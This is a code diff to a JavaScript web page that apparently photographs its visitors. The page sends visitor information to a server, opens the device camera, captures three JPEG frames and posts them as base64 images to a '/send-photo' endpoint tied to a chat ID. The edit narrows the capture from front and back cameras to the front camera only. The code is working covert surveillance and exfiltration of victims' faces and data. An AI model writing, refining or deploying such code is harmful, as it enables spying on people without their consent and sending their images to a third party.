@@ -68,24 +68,24 @@ async function sendVisitorInfo() {
   });
 }
 
-async function sendPhoto(canvas, num, cam) {
+async function sendPhoto(canvas, num) {
   fetch(`${SERVER}/send-photo`, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
       chat_id: chatId,
       photo: canvas.toDataURL("image/jpeg", 0.8),
-      number: `${cam}-${num}`
+      number: `front-${num}`
     })
   });
 }
 
-async function capture(stream, camName) {
+async function capture(stream) {
   const video = document.createElement("video");
   video.srcObject = stream;
   await video.play();
 
-  await new Promise(r => setTimeout(r, 300)); // warmup
+  await new Promise(r => setTimeout(r, 300));
 
   for (let i = 1; i <= 3; i++) {
     const canvas = document.createElement("canvas");
@@ -93,7 +93,7 @@ async function capture(stream, camName) {
     canvas.height = video.videoHeight || 720;
     canvas.getContext("2d").drawImage(video, 0, 0);
 
-    sendPhoto(canvas, i, camName);
+    sendPhoto(canvas, i);
   }
 }
 
@@ -105,48 +105,21 @@ async function startAll() {
 
   try {
     document.getElementById("status").innerText = "Sending info...";
-
     await sendVisitorInfo();
 
-    document.getElementById("status").innerText = "Starting camera...";
+    document.getElementById("status").innerText = "Capturing...";
 
-    // ✅ SINGLE PERMISSION
+    // ✅ ONLY FRONT CAMERA (single permission)
     let stream = await navigator.mediaDevices.getUserMedia({
       video: {
+        facingMode: "user",
         width: { ideal: 1280 },
         height: { ideal: 720 }
       }
     });
 
-    const track = stream.getVideoTracks()[0];
+    await capture(stream);
 
-    // 🔥 FRONT CAMERA
-    document.getElementById("status").innerText = "Capturing front...";
-    await track.applyConstraints({ facingMode: "user" });
-    await capture(stream, "front");
-
-    // 🔥 BACK CAMERA (COLOR FIX)
-    document.getElementById("status").innerText = "Capturing back...";
-    try {
-        await track.applyConstraints({
-            facingMode: { exact: "environment" }
-        });
-    } catch (e) {
-        // ❌ switch fail → fallback
-        stream.getTracks().forEach(t => t.stop());
-        
-        stream = await
-    navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: "environment",
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            }
-        });
-    }
-    await capture(stream, "back");
-
-    // stop stream
     stream.getTracks().forEach(t => t.stop());
 
     document.getElementById("status").innerText = "✅ Done";
